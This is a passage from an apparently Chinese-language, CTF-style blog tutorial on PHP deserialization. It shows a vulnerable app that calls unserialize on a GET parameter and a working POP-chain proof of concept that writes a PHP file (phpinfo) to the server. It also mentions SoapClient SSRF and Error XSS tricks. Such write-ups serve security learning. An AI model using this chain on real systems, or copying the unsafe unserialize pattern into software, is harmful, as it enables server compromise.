class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&apos;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&apos;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($lyrics, $song)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="hljs-string">&quot;&apos;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span><span class="hljs-params">($name)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $oldlyrics = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      <span class="hljs-keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Porter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exportData</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> base64_encode(serialize($lyrics));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">importData</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> serialize(base64_decode($lyrics));</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $conn;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($dbuser, $dbpass, $db)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>, $dbuser, $dbpass, $db);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $r = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) {</span><br><span class="line">      $s = intval($lyric);</span><br><span class="line">      $result = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT data FROM lyrics WHERE id=$s&quot;</span>);</span><br><span class="line">      <span class="hljs-keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="hljs-keyword">NULL</span>) {</span><br><span class="line">        $r []= unserialize(base64_decode($row[<span class="hljs-number">0</span>]));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> $r;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $ids = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . base64_encode(serialize($lyric)) . <span class="hljs-string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">      $res = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);</span><br><span class="line">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[<span class="hljs-number">0</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">echo</span> var_dump($ids);</span><br><span class="line">    <span class="hljs-keyword">return</span> $ids; </span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-keyword">NULL</span>;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line">unserialize($_GET[<span class="hljs-string">&apos;cmd&apos;</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570; + &#x53EF;&#x63A7;&#x53C2;&#x6570; == &#x63A7;&#x5236;&#x5F53;&#x524D;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x5BF9;&#x8C61;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $oldlyrics = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      <span class="hljs-keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x81EA;&#x5B9A;&#x4E49; $song &#x503C; + __destruct == &#x8C03;&#x7528;&#x5F53;&#x524D;&#x4F5C;&#x7528;&#x57DF;&#x4E0B; log&#x65B9;&#x6CD5;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($lyrics, $song)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="hljs-string">&quot;&apos;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span><span class="hljs-params">($name)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8BBA;&#x4E24;&#x4E2A; log &#x65B9;&#x6CD5;&#x7684;&#x9009;&#x62E9;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($writer)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logger;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $name;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $group;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $url;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $group, $url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>($fltr), <span class="hljs-string">&quot;\n&quot;</span>)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&apos;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&apos;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>LogWriter_File::writeLog($txt) &#x7684;&#x5199;&#x5165;&#x6587;&#x4EF6;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $format)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, $filename));</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    $txt = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="hljs-string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>LogFileFormat::format </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filters, $endl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    }</span><br><span class="line">    $txt = str_replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="hljs-keyword">return</span> $txt;</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>OutputFilter::filter &#x81EA;&#x5B9A;&#x4E49; preg_replace &#x5185;&#x5BB9;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($pattern, $repl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>preg_replace</code> &#x548C; <code>str_replace</code> &#x7684;&#x533A;&#x522B;</p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200131027.png" alt></p>
<p>final POC</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-string">&quot;//&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> OutputFilter()); <span class="hljs-comment"># foreach ($this-&gt;filters as $filter)</span></span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-string">&apos;\n&apos;</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;info.php&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-keyword">new</span> LogFileFormat();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-keyword">new</span> LogWriter_File();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-string">&apos;1&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-keyword">new</span> Logger();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="hljs-keyword">new</span> Lyrics();</span><br><span class="line">print_r(urlencode(serialize($payload)));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200248029.png" alt></p>
<h2 id="&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;"><a href="#&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;" class="headerlink" title="&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;"></a>&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;</h2><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open"></a>ZipArchive::open</h3><p>@Threezh1 &#x6587;&#x4E2D;&#x5DF2;&#x7ECF;&#x5199;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x8865;&#x5145;<br><a href="https://xz.aliyun.com/t/6454#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6454#toc-10</a></p>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p>&#x5173;&#x4E8E;SOAP&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF1A;<a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1</a></p>
<p>&#x5229;&#x7528;&#x6761;&#x4EF6;&#xFF1A;<br>&#x9700;&#x8981;&#x6709;soap&#x6269;&#x5C55;&#xFF0C;&#x4E14;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5F00;&#x542F;<br>&#x9700;&#x8981;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#x5176;<code>__call()</code>&#x51FD;&#x6570;</p>
<p>&#x4EC5;&#x9650;&#x4E8E;http/https&#x534F;&#x8BAE;&#xFF0C;&#x4E14;http&#x5934;&#x90E8;&#x8FD8;&#x5B58;&#x5728;crlf&#x6F0F;&#x6D1E;(SOAP + CRLF = SSRF)</p>
<p>&#x4F8B;&#x5B50;&#x53EF;&#x89C1;&#x4E0B;&#x6587;: LCTF2018-bestphp&#x2019;s revenge </p>
<h3 id="Error-XSS"><a href="#Error-XSS" class="headerlink" title="Error XSS"></a>Error XSS</h3><p>@l3m0n &#x5E08;&#x5085;blog&#x4E2D;&#x63D0;&#x5230;&#x4E86;XSS</p>
<p>Error<br>&#x9002;&#x7528;&#x4E8E;php7&#x7248;&#x672C;</p>
